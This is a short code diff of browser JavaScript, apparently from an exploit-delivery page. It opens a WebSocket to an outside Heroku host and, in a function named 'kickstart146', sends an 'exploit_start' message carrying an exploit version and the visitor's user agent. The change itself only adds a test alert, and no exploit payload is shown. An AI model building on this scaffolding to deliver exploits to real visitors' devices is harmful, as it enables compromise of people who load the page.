@@ -2,6 +2,7 @@ var socket = new WebSocket("wss://slug-detected.herokuapp.com/")
 
 var keep = [];
 async function kickstart146() {
+  alert("Test");
 	socket.send(`exploit_start {
 		exploitVersion: "14.6",
 		userAgent: ${navigator.userAgent},
